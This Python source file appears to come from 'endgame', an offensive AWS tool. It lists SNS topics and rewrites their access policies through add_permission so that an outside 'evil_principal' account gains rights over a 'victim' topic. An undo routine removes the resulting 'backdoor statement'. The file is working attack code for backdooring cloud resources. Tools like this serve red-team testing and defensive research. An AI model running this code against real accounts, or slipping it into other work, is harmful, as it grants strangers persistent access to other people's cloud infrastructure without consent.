import json
import logging
from abc import ABC
import boto3
import botocore
from botocore.exceptions import ClientError
from policy_sentry.util.arns import get_resource_string
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.utils import get_sid_names_with_error_handling
from endgame.shared.response_message import ResponseMessage
from endgame.shared.list_resources_response import ListResourcesResponse
from endgame.shared.response_message import ResponseGetRbp

logger = logging.getLogger(__name__)

# Valid SNS policy actions
# https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-api-permissions-reference.html#sns-valid-policy-actions
valid_sns_policy_actions = [
    "sns:AddPermission",
    "sns:DeleteTopic",
    "sns:GetTopicAttributes",
    "sns:ListSubscriptionsByTopic",
    "sns:Publish",
    "sns:Receive",
    "sns:RemovePermission",
    "sns:SetTopicAttributes",
    "sns:Subscribe",
]
valid_sns_policy_actions_str = ",".join(valid_sns_policy_actions)


class SnsTopic(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.name = name
        self.service = "sns"
        self.region = region
        self.current_account_id = current_account_id
        self.resource_type = "topic"
        self.override_account_id_instead_of_principal = True
        self.override_action = ",".join(valid_sns_policy_actions)
        self.override_resource_block = self.arn
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id,
                         override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
                         override_action=self.override_action, override_resource_block=self.override_resource_block)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.name}"

    def _get_rbp(self) -> ResponseGetRbp:
        """Get the resource based policy for this resource and store it"""
        logger.debug("Getting resource policy for %s" % self.arn)
        # When there is no policy, let's return an empty policy to avoid breaking things
        policy = constants.get_empty_policy()
        try:
            response = self.client.get_topic_attributes(TopicArn=self.arn)
            attributes = response.get("Attributes")
            if attributes.get("Policy"):
                policy = constants.get_empty_policy()
                policy["Statement"].extend(json.loads(attributes.get("Policy")).get("Statement"))
            else:
                policy = constants.get_empty_policy()
            success = True
        except self.client.exceptions.ResourceNotFoundException as error:
            logger.critical(error)
            success = False
        except botocore.exceptions.ClientError as error:
            logger.critical(error)
            success = False
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        response = ResponseGetRbp(policy_document=policy_document, success=success)
        return response

    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
        logger.debug("Setting resource policy for %s" % self.arn)
        new_policy_document = PolicyDocument(
            policy=evil_policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        new_policy_json = {
            "Version": "2012-10-17",
            "Statement": []
        }
        current_sids = get_sid_names_with_error_handling(self.original_policy)
        try:
            for statement in new_policy_document.statements:
                if statement.sid not in current_sids:
                    self.client.add_permission(
                        TopicArn=self.arn,
                        Label=statement.sid,
                        ActionName=self.sns_actions_without_prefixes(statement.actions),
                        AWSAccountId=statement.aws_principals,
                    )
                new_policy_json["Statement"].append(json.loads(statement.__str__()))
            message = "success"
            success = True
        except botocore.exceptions.ClientError as error:
            message = str(error)
            success = False
            logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
                            f"{self.name}. %s" % error)
        get_rbp_response = self._get_rbp()
        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=get_rbp_response.policy_document.json, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Wraps client.remove_permission"""
        logger.debug(f"Removing {evil_principal} from {self.arn}")
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        message = "404: No backdoor statement found"
        try:
            for statement in self.policy_document.statements:
                if statement.sid == constants.SID_SIGNATURE:
                    if not dry_run:
                        response = self.client.remove_permission(
                            TopicArn=self.arn,
                            Label=statement.sid,
                        )
                else:
                    new_policy["Statement"].append(json.loads(statement.__str__()))
            success = True
        except botocore.exceptions.ClientError as error:
            success = False
            logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
                            f"{self.name}. %s" % error)
        response_message = ResponseMessage(message=message, operation=operation, success=success, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message

    def sns_actions_without_prefixes(self, actions_with_service_prefix):
        # SNS boto3 client requires that you provide Publish instead of sns:Publish
        updated_actions = []

        if isinstance(actions_with_service_prefix, list):
            actions = actions_with_service_prefix
        else:
            actions = [actions_with_service_prefix]
        for action in actions:
            if ":" in action:
                temp_action = action.split(":")[1]
                if temp_action == "*":
                    updated_actions.extend(valid_sns_policy_actions)
                else:
                    updated_actions.append(temp_action)
            else:
                updated_actions.append(action)

        return updated_actions


class SnsTopics(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "sns"
        self.resource_type = "topic"

    @property
    def resources(self) -> [ListResourcesResponse]:
        """Get a list of these resources"""
        these_resources = []

        paginator = self.client.get_paginator('list_topics')
        page_iterator = paginator.paginate()
        for page in page_iterator:
            resources = page["Topics"]
            for resource in resources:
                arn = resource.get("TopicArn")
                name = get_resource_string(arn)
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=name)
                these_resources.append(list_resources_response)
        return these_resources
